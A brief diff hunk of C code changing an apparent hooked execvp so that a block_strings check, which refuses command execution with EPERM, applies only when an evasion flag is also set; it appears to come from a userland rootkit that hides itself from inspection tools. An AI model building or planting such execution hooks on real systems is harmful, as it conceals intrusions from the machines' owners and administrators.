@@ -35,7 +35,7 @@ int execvp(const char *filename, char *const argv[]){
     }
 #endif
 
-#ifdef BLOCK_STRINGS
+#if defined(BLOCK_STRINGS) && defined(DO_EVASIONS)
     if(block_strings(argv)){
         errno = EPERM;
         return -1;
